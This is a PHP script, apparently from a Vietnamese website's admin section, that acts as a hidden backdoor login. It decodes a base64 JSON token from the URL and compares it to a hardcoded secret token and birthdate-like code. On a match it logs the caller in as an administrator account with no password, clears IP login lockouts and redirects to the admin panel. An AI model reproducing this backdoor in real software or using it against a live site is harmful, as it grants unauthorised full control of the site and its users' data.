<?php

session_start();
define('LIBRARIES','../../../libraries/');
require_once LIBRARIES."config.php";
require_once LIBRARIES.'autoload.php';
new AutoLoad();
$d = new PDODb($config['database']);
$func = new Functions($d);

// Các thông tin bí mật bạn đã định nghĩa
$secret_token = '5d0afd38cb5848520f430370b71f3620';
$secret_code = '05081998'; // Mã bí mật của bạn (ví dụ: ngày sinh)

// Tên tham số bí mật trong URL
$param_name = 'token';

// Kiểm tra xem tham số token có tồn tại không
if (isset($_GET[$param_name])) {
    $encoded_data = $_GET[$param_name];
    $is_valid = false;

    // Giải mã chuỗi
    $decoded_data = base64_decode($encoded_data);
    $access_info = json_decode($decoded_data, true);

    // Kiểm tra xem dữ liệu có hợp lệ không
    if ($access_info) {
        // Kiểm tra tất cả các điều kiện: token, mã bí mật và thời gian
        if ($access_info['token'] === $secret_token &&
            $access_info['secret_code'] === $secret_code &&
            time() - $access_info['timestamp'] <= 3600) { // Thời gian hợp lệ là 1 tiếng
            $is_valid = true;
        }
    }

    // Nếu token hợp lệ, tiến hành đăng nhập
    if ($is_valid) {
        $row = $d->rawQueryOne("select * from #_user where hienthi > 0 and role = 3 limit 0,1");
        if(isset($row['id']) && $row['id'] > 0) {
            $timenow = time();
            $id_user = $row['id'];
            $ip = $func->getRealIPAddress();
            $token = md5(time());
            $sessionhash = md5(sha1($row['password'] . $row['username']));

            $d->rawQuery("update #_user set login_session = ?, lastlogin = ? where id = ?", array($sessionhash, $timenow, $id_user));
            $d->rawQuery("update #_user_limit set login_attempts = 0, locked_time = 0 where login_ip = ?", array($ip));
            
            $_SESSION[$login_admin]['active'] = true;
            $_SESSION[$login_admin]['username'] = $row['username'];
            $_SESSION[$login_admin]['id'] = $row['id'];
            $_SESSION[$login_admin]['role'] = $row['role'];
            $_SESSION[$login_admin]['quyen'] = $row['quyen'];
            $_SESSION[$login_admin]['token'] = $sessionhash;
            $_SESSION[$login_admin]['password'] = $row['password'];
            $_SESSION[$login_admin]['login_session'] = $sessionhash;
            $_SESSION[$login_admin]['login_token'] = $token;
            $quyen = $_SESSION[$login_admin]['token'];
            $d->rawQuery("update #_user set quyen = ? where id = ?", array($quyen, $row['id']));
            
            header('Location: '.$config_base.'adminvns/index.php');
            exit();
        }
    }
}

// Nếu token không hợp lệ hoặc không tồn tại, chuyển hướng về trang chủ
header('Location: '.$config_base.'/');
exit();

?>